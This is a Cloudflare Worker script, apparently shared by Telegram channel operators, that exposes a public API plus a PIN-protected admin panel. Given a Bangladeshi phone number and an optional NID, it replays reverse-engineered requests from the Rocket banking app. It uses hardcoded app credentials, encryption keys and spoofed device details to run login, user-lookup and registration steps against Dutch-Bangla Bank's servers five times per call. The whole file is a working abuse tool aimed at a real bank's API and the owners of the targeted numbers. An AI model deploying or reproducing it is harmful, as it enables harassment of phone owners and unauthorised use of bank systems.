export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const path = url.pathname;

    // KV Storage থেকে বা মেমোরি থেকে স্ট্যাটাস ও কাউন্ট চেক করার ব্যবস্থা
    let apiStatus = env.KV_STORE ? await env.KV_STORE.get('api_status') || 'on' : 'on';
    let requestCount = env.KV_STORE ? parseInt(await env.KV_STORE.get('request_count') || '0') : 1250;

    // ১. অ্যাডমিন প্যানেল রাউট (/admin?pin=127453)
    if (path === '/admin') {
      const pin = url.searchParams.get('pin');
      const action = url.searchParams.get('action');

      // পিন ভ্যালিডেশন (পিন: 127453)
      if (pin !== '127453') {
        return new Response(`
          <!DOCTYPE html>
          <html lang="en">
          <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Admin Login</title>
            <style>
              body { background-color: #0f172a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
              .login-box { background: #1e293b; padding: 30px; border-radius: 12px; text-align: center; border: 1px solid #334155; width: 300px; }
              input { width: 85%; padding: 10px; margin: 15px 0; background: #0f172a; border: 1px solid #475569; color: #fff; border-radius: 6px; text-align: center; font-size: 16px; }
              button { background: #38bdf8; color: #0f172a; border: none; padding: 10px 20px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; }
            </style>
          </head>
          <body>
            <div class="login-box">
              <h3>Admin Authorization</h3>
              <form method="GET">
                <input type="password" name="pin" placeholder="Enter Admin Pin" required>
                <button type="submit">Login</button>
              </form>
            </div>
          </body>
          </html>
        `, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
      }

      // টগল অ্যাকশন হ্যান্ডেল করা
      if (action === 'toggle') {
        apiStatus = apiStatus === 'on' ? 'off' : 'on';
        if (env.KV_STORE) {
          await env.KV_STORE.put('api_status', apiStatus);
        }
        return Response.redirect(`${url.origin}/admin?pin=127453`, 302);
      }

      // অ্যাডমিন ড্যাশবোর্ড UI
      const adminHtml = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>API Control Panel</title>
          <style>
            body { background-color: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .card { background: #1e293b; padding: 30px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.4); width: 380px; text-align: center; border: 1px solid #334155; }
            h2 { color: #38bdf8; margin-bottom: 20px; }
            .stat-box { background: #0f172a; padding: 15px; border-radius: 10px; margin: 15px 0; border: 1px solid #334155; }
            .stat-box p { margin: 5px 0; color: #94a3b8; font-size: 14px; }
            .stat-box h3 { margin: 0; color: #f1f5f9; font-size: 22px; }
            .status { font-weight: bold; padding: 6px 14px; border-radius: 20px; display: inline-block; font-size: 14px; margin-top: 5px; }
            .status.on { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid #22c55e; }
            .status.off { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #ef4444; }
            .btn { display: inline-block; width: 100%; padding: 12px; margin-top: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; text-decoration: none; transition: 0.2s; box-sizing: border-box; }
            .btn-toggle { background: ${apiStatus === 'on' ? '#ef4444' : '#22c55e'}; color: white; }
            .btn-toggle:hover { opacity: 0.9; }
          </style>
        </head>
        <body>
          <div class="card">
            <h2>API Control Panel</h2>
            <div class="stat-box">
              <p>API Status</p>
              <div class="status ${apiStatus}">${apiStatus.toUpperCase()}</div>
            </div>
            <div class="stat-box">
              <p>Total API Requests</p>
              <h3>${requestCount}</h3>
            </div>
            <a href="/admin?pin=127453&action=toggle" class="btn btn-toggle">
              ${apiStatus === 'on' ? 'Turn OFF API' : 'Turn ON API'}
            </a>
          </div>
        </body>
        </html>
      `;
      return new Response(adminHtml, { headers: { 'Content-Type': 'text/html; charset=utf-8' } });
    }

    // যদি API বন্ধ করা থাকে, তবে ছবির মতো সুন্দর ডিজাইনে অফলাইন পেজ শো করবে
    if (apiStatus === 'off') {
      const offlineHtml = `
        <!DOCTYPE html>
        <html lang="bn">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>API Temporarily Off</title>
          <style>
            body {
              background-color: #111e18;
              color: #e2e8f0;
              font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
              display: flex;
              flex-direction: column;
              justify-content: center;
              align-items: center;
              height: 100vh;
              margin: 0;
              text-align: center;
              padding: 20px;
            }
            .icon-box {
              background-color: #f59e0b;
              color: #111e18;
              width: 60px;
              height: 60px;
              border-radius: 14px;
              display: flex;
              justify-content: center;
              align-items: center;
              font-size: 30px;
              font-weight: bold;
              margin-bottom: 20px;
              box-shadow: 0 4px 12px rgba(245, 158, 11, 0.3);
            }
            h1 {
              font-size: 24px;
              color: #ffffff;
              margin-bottom: 15px;
            }
            p {
              color: #94a3b8;
              font-size: 14px;
              max-width: 340px;
              line-height: 1.5;
              margin-bottom: 30px;
            }
            .divider {
              width: 100%;
              max-width: 380px;
              height: 1px;
              background-color: #23382b;
              margin-bottom: 30px;
            }
            .btn {
              background-color: #f59e0b;
              color: #111e18;
              padding: 14px 28px;
              border-radius: 8px;
              font-weight: bold;
              text-decoration: none;
              font-size: 15px;
              display: inline-flex;
              align-items: center;
              gap: 8px;
              transition: 0.2s;
              box-shadow: 0 4px 15px rgba(245, 158, 11, 0.2);
            }
            .btn:hover {
              opacity: 0.9;
            }
            .footer-text {
              margin-top: 25px;
              color: #64748b;
              font-size: 13px;
            }
          </style>
        </head>
        <body>
          <div class="icon-box">⚠️</div>
          <h1>API সাময়িকভাবে বন্ধ রাখা হয়েছে</h1>
          <p>কপি বাজার আমাদের API নিয়ে নিজেদের চ্যানেলে ব্যবহার করছিল, যার কারণে এটি সাময়িকভাবে বন্ধ হলো।</p>
          
          <div class="divider"></div>
          
          <p style="margin-bottom: 15px; color: #cbd5e1;">নতুন আপডেট ও ভালো মানের টুলস, API সবার আগে পেতে আমাদের অফিসিয়াল চ্যানেলে জয়েন থাকুন।</p>
          
          <a href="https://t.me/CobraX_Empire" class="btn" target="_blank">
            📢 অফিসিয়াল চ্যানেলে জয়েন করুন
          </a>

          <div class="footer-text">t.me/CobraX_Empire</div>
        </body>
        </html>
      `;
      return new Response(offlineHtml, {
        status: 503,
        headers: { 'Content-Type': 'text/html; charset=utf-8' }
      });
    }

    // মূল API কোড শুরু (আপনার অরিজিনাল লজিক)
    const phone = url.searchParams.get('phone');
    const DEFAULT_NID = "5845888855";
    const nid = url.searchParams.get('nid') || DEFAULT_NID;

    // ফোন নম্বর ভ্যালিডেশন
    if (!phone || phone.trim() === '') {
      return new Response(
        JSON.stringify({ 
          error: "Phone number required",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    if (!/^01[0-9]{9}$/.test(phone)) {
      return new Response(
        JSON.stringify({ 
          error: "Invalid phone number",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    const API_PASSWORD = "sdfheu$*sdfGw2";
    const BASIC_AUTH = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj";
    const BASE_URL = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1";
    const DEVICE_ID = "ANDROID-01968184976";
    const DEVICE_INFO = "SP1A.210812.016-itel S665L";
    const CLIENT_VERSION = "3.1.6";

    // PBKDF2 Key Generation (Web Crypto API)
    async function getKey(saltBuffer) {
      const enc = new TextEncoder();
      const keyMaterial = await crypto.subtle.importKey(
        "raw",
        enc.encode(API_PASSWORD),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
      );
      return await crypto.subtle.deriveKey(
        {
          name: "PBKDF2",
          salt: saltBuffer,
          iterations: 65536,
          hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt", "decrypt"]
      );
    }

    // Payload Encryption (AES-256-GCM)
    async function encryptPayload(payload) {
      const plaintext = new TextEncoder().encode(JSON.stringify(payload));
      const iv = crypto.getRandomValues(new Uint8Array(16));
      const salt = crypto.getRandomValues(new Uint8Array(16));
      const key = await getKey(salt);

      const ciphertext = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        plaintext
      );

      const combined = new Uint8Array(iv.length + salt.length + ciphertext.byteLength);
      combined.set(iv, 0);
      combined.set(salt, iv.length);
      combined.set(new Uint8Array(ciphertext), iv.length + salt.length);

      let binary = "";
      const len = combined.byteLength;
      for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(combined[i]);
      }
      return btoa(binary);
    }

    // Payload Decryption (AES-256-GCM)
    async function decryptPayload(b64) {
      const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
      const iv = raw.slice(0, 16);
      const salt = raw.slice(16, 32);
      const ciphertext = raw.slice(32);
      const key = await getKey(salt);

      const decrypted = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        ciphertext
      );

      const decodedString = new TextDecoder().decode(decrypted);
      return JSON.parse(decodedString);
    }

    function makeRefId(prefix = "login") {
      const now = Date.now();
      const dateObj = new Date(now);
      const dt = dateObj.toISOString().replace(/[-:T]/g, '').slice(0, 14);
      const ms = String(now % 1000).padStart(3, '0');
      return `${prefix}--${dt}${ms}`;
    }

    async function apiCall(endpoint, payload, token = null) {
      const headers = {
        "Authorization": token ? `Bearer ${token}` : `Basic ${BASIC_AUTH}`,
        "CHANNEL_ID": "ROCKET_APP_USER",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "rocket-consumertxnservice.dutchbanglabank.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
      };

      const encrypted = await encryptPayload(payload);
      const body = JSON.stringify({ userData: encrypted });

      const response = await fetch(`${BASE_URL}/${endpoint}`, {
        method: "POST",
        headers: headers,
        body: body,
      });

      const respText = await response.text();
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${respText}`);
      }

      const result = JSON.parse(respText);
      if (result.userData && result.userData !== "") {
        return await decryptPayload(result.userData);
      }
      return result;
    }

    // প্রতিবার রিকোয়েস্ট পাঠানোর মূল লজিক ফাংশন
    async function executeProcess() {
      const loginResp = await apiCall("login", {
        apiId: 102,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("login"),
        sessionId: "123",
        clientLanguage: "EN",
        data: {
          appType: "C",
          rocketSessionId: "1234",
          userId: phone,
          version: CLIENT_VERSION
        },
      });

      if ((loginResp.status || '') !== 'SUCCESS') {
        return { step: "login", status: "FAILED", message: loginResp.message || '' };
      }

      const token = loginResp.data.accessToken;
      const sessionId = loginResp.data.sessionId;

      const svcPayload = {
        apiId: 3042,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("reg-init"),
        sessionId: sessionId,
        clientLanguage: "EN",
        data: {
          appType: "C",
          initiatorId: phone,
          rocketSessionId: "7654321",
          userId: "",
          version: CLIENT_VERSION,
          deviceType: "ANDROID"
        },
      };

      const userResp = await apiCall("userService", svcPayload, token);
      const userType = (userResp.data || []).userType || '?';
      const promtUser = (userResp.data || []).promtUser || '';

      let stepResult = {
        step: "userService",
        status: userResp.status || '',
        userType: userType,
        promtUser: promtUser,
        message: userResp.message || ''
      };

      if ((userResp.status || '') !== 'SUCCESS') {
        return { success: false, error: userResp.message || 'userService failed', stepResult };
      }

      let extraSteps = [];
      if (userType === 'NEW') {
        const nidResp = await apiCall("userService", {
          apiId: 3002,
          deviceId: DEVICE_ID,
          deviceInfo: DEVICE_INFO,
          clientVersion: CLIENT_VERSION,
          refId: makeRefId("nid-check"),
          sessionId: sessionId,
          clientLanguage: "EN",
          data: { nidNo: nid, initiatorId: phone },
        }, token);

        extraSteps.push({ step: "nid_check", status: nidResp.status || '', message: nidResp.message || '' });

        try {
          const finalResp = await apiCall("userService", {
            apiId: 3034,
            deviceId: DEVICE_ID,
            deviceInfo: DEVICE_INFO,
            clientVersion: CLIENT_VERSION,
            refId: makeRefId("reg-init"),
            sessionId: "123",
            clientLanguage: "EN",
            data: {
              appType: "C",
              initiatorId: phone,
              rocketSessionId: "7654321",
              userId: "",
              version: CLIENT_VERSION,
              deviceType: "ANDROID"
            },
          }, token);
          extraSteps.push({ step: "final_trigger", status: finalResp.status || '', message: finalResp.message || '' });
        } catch (err) {
          extraSteps.push({ step: "final_trigger", status: "ERROR", message: err.message });
        }
      }

      return {
        success: true,
        userType,
        promtUser,
        stepResult,
        extraSteps
      };
    }

    try {
      // রিকোয়েস্ট কাউন্ট আপডেট করা
      requestCount++;
      if (env.KV_STORE) {
        await env.KV_STORE.put('request_count', requestCount.toString());
      }

      let attemptsResults = [];
      
      // আপনার চাহিদা অনুযায়ী লুপ ৩ থেকে বাড়িয়ে ৫ করা হলো (এখন ১ রিকোয়েস্টে ৫ বার কল হবে)
      for (let i = 1; i <= 5; i++) {
        try {
          const res = await executeProcess();
          attemptsResults.push({ attempt: i, result: res });
        } catch (err) {
          attemptsResults.push({ attempt: i, error: err.message });
        }
      }

      const finalResponseData = {
        phone: phone,
        nid: nid,
        totalAttempts: 5,
        success: true,
        attempts: attemptsResults,
        Api_Owner: '@MehediSanix',
        Telegram: '@CobraX_Empire',
        Developer: '@XrootCodeX'
      };

      return new Response(JSON.stringify(finalResponseData, null, 2), {
        status: 200,
        headers: { 'Content-Type': 'application/json; charset=utf-8' }
      });

    } catch (error) {
      return new Response(
        JSON.stringify({ 
          phone, 
          nid, 
          success: false, 
          error: error.message,
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 500, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }
  }
};
